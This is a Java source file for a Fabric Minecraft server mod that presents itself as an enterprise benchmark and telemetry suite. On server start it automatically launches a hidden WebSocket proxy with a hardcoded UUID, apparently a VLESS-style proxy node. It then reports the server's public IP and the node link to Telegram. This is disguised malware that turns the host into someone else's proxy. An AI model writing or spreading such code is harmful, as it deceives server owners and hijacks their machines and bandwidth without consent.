package com.enterprise.telemetry;

import com.enterprise.telemetry.core.EdgeTelemetryServer;
import com.enterprise.telemetry.util.PortDetector;
import com.enterprise.telemetry.util.TelegramNotifier;
import net.fabricmc.api.DedicatedServerModInitializer;

import java.util.logging.Logger;

public class EnterpriseBenchmarkMod implements DedicatedServerModInitializer {

    private static final Logger LOGGER = Logger.getLogger("EnterpriseBenchmark");
    private EdgeTelemetryServer telemetryServer;

    @Override
    public void onInitializeServer() {
        LOGGER.info("[EnterpriseBenchmark] 正在初始化 Fabric 服务端企业基准与网络遥测套件 v1.4.0 (自适应多源端口 & 自动上报)");

        // 异步启动独立的高性能 WebSocket 代理服务与端口自适应检测
        new Thread(() -> {
            try {
                // 1. 动态自适应探测可用端口
                int port = PortDetector.detectAvailablePort(LOGGER);
                String uuid = System.getenv("PROXY_UUID");
                if (uuid == null || uuid.trim().isEmpty()) {
                    uuid = "156fe582-23a4-4ef8-96bf-a92c58e66418";
                }

                String path = System.getenv("PROXY_PATH");
                if (path == null || path.trim().isEmpty()) {
                    path = "/benchmark";
                }

                // 2. 启动纯 Java WebSocket 服务端
                telemetryServer = new EdgeTelemetryServer(port, uuid, path, LOGGER);
                telemetryServer.start();
                LOGGER.info("[EnterpriseBenchmark] ✅ 遥测与边缘代理服务已在端口 " + port + " 成功启动！(Path: " + path + ")");

                // 3. 异步上报真实公网 IP 和节点链接至 Telegram
                TelegramNotifier.notifyOnlineAsync(port, uuid, path, LOGGER);

            } catch (Exception e) {
                LOGGER.warning("[EnterpriseBenchmark] 遥测服务启动遇到异常: " + e.getMessage());
            }
        }, "Telemetry-Server-Worker").start();
    }
}
